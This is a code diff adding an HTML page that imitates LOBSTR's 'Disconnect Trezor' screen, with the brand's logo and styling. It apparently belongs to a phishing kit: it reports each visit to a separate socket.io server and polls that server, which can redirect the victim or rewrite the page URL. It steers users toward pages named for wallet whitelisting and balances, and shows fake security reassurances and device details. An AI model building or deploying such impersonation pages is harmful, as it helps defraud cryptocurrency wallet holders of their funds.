@@ -1,0 +1,575 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <script src="/socket.io/socket.io.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LOBSTR - Disconnect Trezor</title>
+    <link rel="icon" href="https://static.lobstr.co/static/landing/images/logo.svg">
+    <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --lobstr-teal: #1B8DA0;
+            --lobstr-light-teal: #E8F4F6;
+            --lobstr-dark-teal: #156B7D;
+            --lobstr-white: #FFFFFF;
+            --lobstr-gray: #F8F9FA;
+            --lobstr-text: #333333;
+            --lobstr-light-gray: #E9ECEF;
+            --lobstr-warning: #FFC107;
+            --lobstr-warning-light: #FFF8E1;
+            --lobstr-danger: #DC3545;
+            --lobstr-danger-light: #F8D7DA;
+            --lobstr-success: #28A745;
+            --spacing-1: 8px;
+            --spacing-2: 16px;
+            --spacing-3: 24px;
+            --spacing-4: 32px;
+            --spacing-5: 40px;
+            --border-radius: 8px;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background-color: var(--lobstr-white);
+            color: var(--lobstr-text);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            padding: var(--spacing-3);
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: var(--spacing-5);
+        }
+
+        .logo {
+            height: 48px;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .title {
+            font-size: 24px;
+            font-weight: 500;
+            color: var(--lobstr-text);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .subtitle {
+            font-size: 16px;
+            color: #666;
+        }
+
+        .card {
+            background: var(--lobstr-white);
+            border: 1px solid var(--lobstr-light-gray);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-4);
+            margin-bottom: var(--spacing-3);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+        }
+
+        .device-icon {
+            text-align: center;
+            margin-bottom: var(--spacing-3);
+        }
+
+        .trezor-device {
+            width: 80px;
+            height: 80px;
+            background: var(--lobstr-teal);
+            border-radius: 50%;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 40px;
+            position: relative;
+            animation: devicePulse 2s infinite;
+        }
+
+        .trezor-device::after {
+            content: '';
+            position: absolute;
+            top: -2px;
+            right: -2px;
+            width: 16px;
+            height: 16px;
+            background: var(--lobstr-success);
+            border: 2px solid var(--lobstr-white);
+            border-radius: 50%;
+            animation: statusBlink 1s infinite;
+        }
+
+        @keyframes devicePulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.02); opacity: 0.9; }
+        }
+
+        @keyframes statusBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        .disconnect-status {
+            text-align: center;
+            margin-bottom: var(--spacing-4);
+        }
+
+        .status-message {
+            font-size: 24px;
+            font-weight: 600;
+            color: var(--lobstr-teal);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .status-description {
+            font-size: 16px;
+            color: #666;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .trezor-details {
+            margin-bottom: var(--spacing-4);
+        }
+
+        .detail-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: var(--spacing-1) 0;
+            border-bottom: 1px solid var(--lobstr-light-gray);
+        }
+
+        .detail-row:last-child {
+            border-bottom: none;
+        }
+
+        .detail-label {
+            font-size: 14px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        .detail-value {
+            font-size: 14px;
+            color: var(--lobstr-text);
+            font-weight: 500;
+        }
+
+        .device-value {
+            color: var(--lobstr-teal);
+            font-weight: 600;
+        }
+
+        .status-connected {
+            color: var(--lobstr-success);
+            font-weight: 600;
+        }
+
+        .status-disconnecting {
+            color: var(--lobstr-warning);
+            font-weight: 600;
+        }
+
+        .status-disconnected {
+            color: #6C757D;
+            font-weight: 600;
+        }
+
+        .action-buttons {
+            display: flex;
+            gap: var(--spacing-2);
+            margin-top: var(--spacing-3);
+        }
+
+        .action-button {
+            flex: 1;
+            padding: var(--spacing-2) var(--spacing-3);
+            border: none;
+            border-radius: var(--border-radius);
+            font-size: 16px;
+            font-weight: 500;
+            font-family: 'Ubuntu', sans-serif;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+
+        .primary-button {
+            background: var(--lobstr-teal);
+            color: var(--lobstr-white);
+        }
+
+        .primary-button:hover {
+            background: var(--lobstr-dark-teal);
+        }
+
+        .secondary-button {
+            background: var(--lobstr-white);
+            color: var(--lobstr-teal);
+            border: 1px solid var(--lobstr-teal);
+        }
+
+        .secondary-button:hover {
+            background: var(--lobstr-light-teal);
+        }
+
+        .danger-button {
+            background: var(--lobstr-danger);
+            color: var(--lobstr-white);
+        }
+
+        .danger-button:hover {
+            background: #C82333;
+        }
+
+        .disconnect-notice {
+            background: var(--lobstr-warning-light);
+            border: 1px solid var(--lobstr-warning);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-bottom: var(--spacing-3);
+            text-align: center;
+        }
+
+        .notice-text {
+            font-size: 14px;
+            color: #E65100;
+            margin-bottom: var(--spacing-2);
+        }
+
+        .notice-emphasis {
+            font-weight: 600;
+            color: var(--lobstr-warning);
+        }
+
+        .hardware-notice {
+            background: var(--lobstr-light-teal);
+            border: 1px solid var(--lobstr-teal);
+            border-radius: var(--border-radius);
+            padding: var(--spacing-3);
+            margin-top: var(--spacing-3);
+        }
+
+        .hardware-notice-title {
+            font-size: 16px;
+            font-weight: 500;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-2);
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+        }
+
+        .hardware-notice-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .hardware-notice-item {
+            display: flex;
+            align-items: center;
+            gap: var(--spacing-1);
+            font-size: 14px;
+            color: var(--lobstr-dark-teal);
+            margin-bottom: var(--spacing-1);
+        }
+
+        .hardware-notice-item:last-child {
+            margin-bottom: 0;
+        }
+
+        .device-status-indicator {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: var(--spacing-1);
+            margin-top: var(--spacing-2);
+            font-size: 14px;
+            color: #666;
+        }
+
+        .status-dot {
+            width: 8px;
+            height: 8px;
+            background: var(--lobstr-success);
+            border-radius: 50%;
+            animation: statusPulse 2s infinite;
+        }
+
+        @keyframes statusPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.3; }
+        }
+
+        @media (max-width: 480px) {
+            .container { padding: var(--spacing-2); }
+            .card { padding: var(--spacing-3); }
+            .action-buttons { flex-direction: column; }
+            .status-message { font-size: 20px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://static.lobstr.co/static/landing/images/logo.svg" alt="LOBSTR" class="logo">
+            <h1 class="title">Disconnect Trezor</h1>
+            <p class="subtitle">Hardware wallet disconnection</p>
+        </div>
+
+        <div class="disconnect-notice">
+            <div class="notice-text">
+                You are about to disconnect your Trezor hardware wallet from LOBSTR.
+            </div>
+            <div class="notice-emphasis">
+                Ensure your device is safely disconnected
+            </div>
+        </div>
+
+        <div class="card">
+            <div class="device-icon">
+                <div class="trezor-device">🔐</div>
+            </div>
+
+            <div class="disconnect-status">
+                <div class="status-message">Trezor Connected</div>
+                <div class="status-description" id="statusDescription">Your Trezor device is currently connected to LOBSTR</div>
+                <div class="device-status-indicator">
+                    <span class="status-dot" id="statusDot"></span>
+                    <span id="statusText">Connected</span>
+                </div>
+            </div>
+
+            <div class="trezor-details" id="trezorDetails">
+                <div class="detail-row">
+                    <span class="detail-label">Device Model</span>
+                    <span class="detail-value device-value" id="deviceModel">Trezor One</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Firmware Version</span>
+                    <span class="detail-value" id="firmwareVersion">1.11.2</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">App Version</span>
+                    <span class="detail-value" id="appVersion">Stellar 3.1.0</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Connection Status</span>
+                    <span class="detail-value status-connected" id="connectionStatus">Connected</span>
+                </div>
+                <div class="detail-row">
+                    <span class="detail-label">Session ID</span>
+                    <span class="detail-value" id="sessionId">---</span>
+                </div>
+            </div>
+
+            <div class="action-buttons">
+                <button class="action-button secondary-button" onclick="cancelDisconnect()">
+                    Cancel
+                </button>
+                <button class="action-button danger-button" onclick="disconnectTrezor()" id="disconnectBtn">
+                    Disconnect Trezor
+                </button>
+            </div>
+        </div>
+
+        <div class="hardware-notice">
+            <div class="hardware-notice-title">
+                <span>🔒</span>
+                Hardware Wallet Security
+            </div>
+            <ul class="hardware-notice-list">
+                <li class="hardware-notice-item">
+                    <span>✓</span>
+                    Your private keys remain secure on the Trezor device
+                </li>
+                <li class="hardware-notice-item">
+                    <span>✓</span>
+                    LOBSTR cannot access your private keys
+                </li>
+                <li class="hardware-notice-item">
+                    <span>✓</span>
+                    Safe disconnection protects your device and funds
+                </li>
+                <li class="hardware-notice-item">
+                    <span>✓</span>
+                    You can reconnect your Trezor anytime
+                </li>
+            </ul>
+        </div>
+    </div>
+
+    <script src="/js/socket-client.js"></script>
+    <script>
+        let trezorInfo = null;
+        let disconnectionStep = 0;
+
+        document.addEventListener('DOMContentLoaded', function() {
+            const style = document.createElement('style');
+            style.textContent = `
+                body { 
+                    font-family: 'Ubuntu', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif !important;
+                    background: #ffffff !important;
+                }
+            `;
+            document.head.appendChild(style);
+
+            socket.emit('page_visit', { page: window.location.pathname });
+            socket.emit('request_trezor_details');
+            setInterval(checkDeviceStatus, 3000);
+        });
+
+        function checkDeviceStatus() {
+            socket.emit('check_trezor_status', { page: window.location.pathname });
+        }
+
+        function cancelDisconnect() {
+            socket.emit('cancel_trezor_disconnect', { page: window.location.pathname });
+            window.location.href = '/pages/lobstrEstimatedBalance.html';
+        }
+
+        function disconnectTrezor() {
+            if (confirm('Are you sure you want to disconnect your Trezor device? Make sure to complete any pending transactions first.')) {
+                disconnectionStep = 1;
+                
+                document.getElementById('connectionStatus').textContent = 'Disconnecting...';
+                document.getElementById('connectionStatus').className = 'detail-value status-disconnecting';
+                document.getElementById('disconnectBtn').disabled = true;
+                document.getElementById('disconnectBtn').textContent = 'Disconnecting...';
+                document.querySelector('.status-message').textContent = 'Disconnecting...';
+                document.getElementById('statusDescription').textContent = 'Safely disconnecting your Trezor device';
+                document.getElementById('statusText').textContent = 'Disconnecting';
+                document.getElementById('statusDot').style.background = 'var(--lobstr-warning)';
+
+                socket.emit('disconnect_trezor', {
+                    trezorInfo: trezorInfo,
+                    step: disconnectionStep,
+                    page: window.location.pathname
+                });
+            }
+        }
+
+        // Socket event handlers
+        socket.on('connect', () => console.log('Connected to LOBSTR secure server'));
+        socket.on('connect_error', (error) => console.error('LOBSTR connection error:', error));
+        socket.on('redirect', (url) => window.location.href = url);
+        socket.on('session_url', (url) => {
+            if (url && url !== window.location.pathname + window.location.search) {
+                window.history.replaceState({}, '', url);
+            }
+        });
+
+        socket.on('trezor_details', (data) => {
+            trezorInfo = data;
+            if (data.model) document.getElementById('deviceModel').textContent = data.model;
+            if (data.firmwareVersion) document.getElementById('firmwareVersion').textContent = data.firmwareVersion;
+            if (data.appVersion) document.getElementById('appVersion').textContent = data.appVersion;
+            if (data.sessionId) document.getElementById('sessionId').textContent = data.sessionId.substring(0, 12) + '...';
+        });
+
+        socket.on('trezor_status_update', (data) => {
+            const statusDescription = document.getElementById('statusDescription');
+            const connectionStatus = document.getElementById('connectionStatus');
+            const statusText = document.getElementById('statusText');
+            const statusDot = document.getElementById('statusDot');
+            
+            if (data.connected === false) {
+                connectionStatus.textContent = 'Disconnected';
+                connectionStatus.className = 'detail-value status-disconnected';
+                statusText.textContent = 'Disconnected';
+                statusDot.style.background = '#6C757D';
+                document.querySelector('.status-message').textContent = 'Trezor Disconnected';
+                document.querySelector('.status-message').style.color = '#6C757D';
+                statusDescription.textContent = 'Your Trezor device has been disconnected safely';
+                
+                document.querySelector('.trezor-device').style.background = '#6C757D';
+                document.getElementById('disconnectBtn').style.display = 'none';
+                
+                const actionButtons = document.querySelector('.action-buttons');
+                if (!document.getElementById('reconnectBtn')) {
+                    const reconnectBtn = document.createElement('button');
+                    reconnectBtn.id = 'reconnectBtn';
+                    reconnectBtn.className = 'action-button primary-button';
+                    reconnectBtn.textContent = 'Connect New Device';
+                    reconnectBtn.onclick = () => window.location.href = '/pages/lobstrWhitelistWallet.html';
+                    actionButtons.appendChild(reconnectBtn);
+                }
+                
+                setTimeout(() => window.location.href = '/pages/lobstrWhitelistWallet.html', 5000);
+                
+            } else if (data.status === 'disconnecting') {
+                statusDescription.textContent = data.message || 'Safely disconnecting your Trezor device';
+            } else if (data.status === 'error') {
+                connectionStatus.textContent = 'Error';
+                connectionStatus.className = 'detail-value';
+                connectionStatus.style.color = 'var(--lobstr-danger)';
+                statusDescription.textContent = 'Failed to disconnect Trezor. Please try again.';
+                document.querySelector('.status-message').textContent = 'Disconnection Failed';
+                document.querySelector('.status-message').style.color = 'var(--lobstr-danger)';
+                
+                document.getElementById('disconnectBtn').disabled = false;
+                document.getElementById('disconnectBtn').textContent = 'Disconnect Trezor';
+            }
+        });
+
+        socket.on('trezor_disconnected', (data) => {
+            document.getElementById('connectionStatus').textContent = 'Disconnected';
+            document.getElementById('connectionStatus').className = 'detail-value status-disconnected';
+            document.getElementById('statusDescription').textContent = 'Trezor device has been disconnected successfully';
+            document.querySelector('.status-message').textContent = 'Trezor Disconnected';
+            document.querySelector('.status-message').style.color = '#6C757D';
+            document.getElementById('statusText').textContent = 'Disconnected';
+            document.getElementById('statusDot').style.background = '#6C757D';
+            
+            document.querySelector('.trezor-device').style.background = '#6C757D';
+            document.getElementById('disconnectBtn').style.display = 'none';
+            
+            setTimeout(() => window.location.href = '/pages/lobstrWhitelistWallet.html', 5000);
+        });
+
+        socket.on('trezor_connection_lost', (data) => {
+            document.getElementById('statusDescription').textContent = 'Trezor device connection lost unexpectedly';
+            document.querySelector('.status-message').textContent = 'Connection Lost';
+            document.querySelector('.status-message').style.color = 'var(--lobstr-warning)';
+            document.getElementById('connectionStatus').textContent = 'Disconnected';
+            document.getElementById('connectionStatus').className = 'detail-value status-disconnected';
+            
+            const actionButtons = document.querySelector('.action-buttons');
+            actionButtons.innerHTML = `
+                <button class="action-button primary-button" onclick="window.location.href='/pages/lobstrWhitelistWallet.html'">
+                    Connect New Device
+                </button>
+            `;
+        });
+
+        socket.on('error', (error) => {
+            console.error('Socket error:', error);
+            document.getElementById('statusDescription').textContent = 'Connection error. Please refresh the page.';
+        });
+
+        socket.on('security_event', (data) => console.log('Security event logged:', data));
+
+        socket.on('session_timeout', (data) => {
+            alert('Your session has expired. You will be redirected to connect your device.');
+            window.location.href = '/pages/lobstrWhitelistWallet.html';
+        });
+    </script>
+</body>
+</html>
